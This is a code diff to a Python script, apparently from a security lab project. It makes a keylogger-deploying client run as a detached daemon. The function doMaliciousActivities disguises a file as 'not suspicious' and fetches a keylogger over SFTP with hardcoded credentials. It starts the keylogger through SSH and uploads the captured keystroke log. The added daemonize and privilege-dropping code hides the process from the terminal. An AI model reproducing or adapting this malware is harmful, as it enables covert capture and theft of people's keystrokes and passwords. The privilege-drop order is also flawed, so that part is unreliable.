@@ -10,6 +10,11 @@ import threading
 import subprocess
 import time
 import threading
+import sys
+import atexit
+import signal
+
+pidfile = "/tmp/client.pid"
 
 
 class sftpClient(object):
@@ -157,46 +162,161 @@ class sshClient(object):
             self.ssh.close()
 
 
+def removePidProcess():
+    if os.path.exists(pidfile):
+        logger.info("Server process killed...\n")
+        with open(pidfile) as file:
+            pid = int(file.readline().rstrip())
+            os.kill(pid, signal.SIGTERM)
+    else:
+        logger.error("Expected server pidfile not found")
+
+
+def dropPrivileges(uid=65534, gid=65534):
+    """Drops UID and GID privileges if current process has access to root.
+    98 is used to set new UID and GID.
+    UIDs 1 through 99 are traditionally reserved for special system users (pseudo-users),
+    such as wheel, daemon, lp, operator, news, mail, etc.
+    Reference: http://www.linfo.org/uid.html"""
+    try:
+        # If process has access to root ...
+        if os.getuid() == 0:
+            logger.info("Dropping root access privileges")
+        # Setting new UID and GID
+            try:
+                os.setuid(uid)
+            except OSError as e:
+                logger.error(f"'Could not set effective user id: {e}")
+
+            try:
+                os.setgid(gid)
+            except OSError as e:
+                logger.error(f"'Could not set effective group id: {e}")
+        else:
+            # Process has no root access
+            logger.info("No root privileges")
+    except Exception as e:
+        logger.error("Failed to drop privileges: {e}")
+        raise Exception(e)
+
+
+def daemonize(pidfile, *, stdin='/dev/null',
+              stdout='/dev/null',
+              stderr='/dev/null'):
+    """The code below is adapted by:
+    https://github.com/dabeaz/python-cookbook/blob/master/
+    src/12/launching_a_daemon_process_on_unix/daemon.py
+    It uses Unix double-fork magic based on Stevens's book
+    "Advanced Programming in the UNIX Environment".
+    Creates a daemon that is diassociated with the terminal
+    and has no root privileges. Once double-forking is successful
+    it writes its pid to a designated pidfile. The pidfile
+    is later used to kill the daemon.
+    """
+
+    # If pidfile exists, there is a server program that is currently running
+    if os.path.exists(pidfile):
+        raise RuntimeError('Already running')
+
+    # First fork (detaches from parent)
+    try:
+        if os.fork() > 0:
+            # Parent exit
+            raise SystemExit(0)
+    except OSError as e:
+        raise RuntimeError(f'fork #1 failed: {e}')
+
+    # Decouple from parent environment
+    os.chdir('/tmp')
+    os.umask(0)
+    os.setsid()
+    dropPrivileges()
+
+    logger.info("fork#1 successfull")
+    # Second fork (relinquish session leadership)
+    try:
+        if os.fork() > 0:
+            raise SystemExit(0)
+    except OSError as e:
+        raise RuntimeError(f'fork #2 failed: {e}')
+
+    # Flush I/O buffers
+    sys.stdout.flush()
+    sys.stderr.flush()
+
+    # Replace file descriptors for stdin, stdout, and stderr
+    with open(stdin, 'rb', 0) as f:
+        os.dup2(f.fileno(), sys.stdin.fileno())
+    with open(stdout, 'ab', 0) as f:
+        os.dup2(f.fileno(), sys.stdout.fileno())
+    with open(stderr, 'ab', 0) as f:
+        os.dup2(f.fileno(), sys.stderr.fileno())
+
+    # PID of the double-forked daemon
+    fork2DaemonPID = os.getpid()
+
+    logger.info("Writing pidfile")
+    # Write the PID file
+    with open(pidfile, 'w') as f:
+        print(fork2DaemonPID, file=f)
+
+    logger.info(f"fork#2 successful pid[{fork2DaemonPID}]")
+
+    # Arrange to have the PID file removed on exit/signal
+    atexit.register(lambda: os.remove(pidfile))
+    atexit.register(lambda: removePidProcess())
+
+    # Signal handler for termination (required)
+    def sigterm_handler(signo, frame):
+        raise SystemExit(1)
+
+    signal.signal(signal.SIGTERM, sigterm_handler)
+
+
 def doMaliciousActivities():
 
     remotepath = "/home/lab/bin/py/project/a1KeyLogger.py"
-    remotepath2 = "/home/lab/bin/py/project/keyLogger.log"
-    localpath = "./ZZZZ_NOT_SUSPICIOUS_FILE"
+    localpath = "/tmp/ZZZZ_NOT_SUSPICIOUS_FILE"
+    remotepath2 = "/home/lab/bin/py/project/clientKeyLogs.log"
     localpath2 = "/tmp/keylog.log"
+
     try:
-        pid = os.fork()
-        if pid == 0:
-            # make password file
-            os.system("touch ZZZZ_NOT_SUSPICIOUS_FILE")
+        daemonize(pidfile, stdout='/tmp/client.pid', stderr='/tmp/client.pid')
+        # make password file
+        os.system("touch /tmp/ZZZZ_NOT_SUSPICIOUS_FILE")
 
-            sftp = sftpClient("localhost", 22, "lab", "lab")
-            sftp.downloadFile(remotepath, localpath)
+        sftp = sftpClient("localhost", 22, "lab", "lab")
+        sftp.downloadFile(remotepath, localpath)
 
-            ssh = sshClient("localhost", 9000, "rick", "jacky")
-            ssh.invoke_shell("start")
+        ssh = sshClient("localhost", 9000, "rick", "jacky")
+        ssh.invoke_shell("start")
 
-            logger.info("Main before creating thread")
-            stopKeyloggerThread = threading.Thread(
-                target=ssh.stopKeylogger, daemon=True)
-            logger.info("Main before running thread")
-            stopKeyloggerThread.start()
+        logger.info("Main before creating thread")
+        stopKeyloggerThread = threading.Thread(
+            target=ssh.stopKeylogger, daemon=True)
+        logger.info("Main before running thread")
+        stopKeyloggerThread.start()
 
-            while ssh.command != "stop":
-                logger.info("Sleeping . . . ")
-                time.sleep(4)
-                logger.info(f"Command: {ssh.command}")
-                logger.info("Awake!")
+        while ssh.command != "stop":
+            logger.info("Sleeping . . . ")
+            time.sleep(4)
+            logger.info(f"Command: {ssh.command}")
+            logger.info("Awake!")
 
-            stopKeyloggerThread.join()
+        stopKeyloggerThread.join()
 
-            sftp.uploadFile(remotepath2, localpath2)
+        sftp.uploadFile(remotepath2, localpath2)
 
-        # kill child process
-        while True:
-            try:
-                pid,  status = os.waitpid(-1,  os.WNOHANG)
-            except OSError:
-                break
+        # Kill the process id that is located in the pidfile
+        if os.path.exists(pidfile):
+            logger.info("Server process killed...\n")
+            with open(pidfile) as file:
+                pid = int(file.readline().rstrip())
+                os.kill(pid, signal.SIGTERM)
+        else:
+            print("Expected server pidfile not found", file=sys.stderr)
+            logger.error("Expected server pidfile not found")
+            raise SystemExit(1)
     except Exception as e:
         logger.error(f"Error: {e}")
         raise
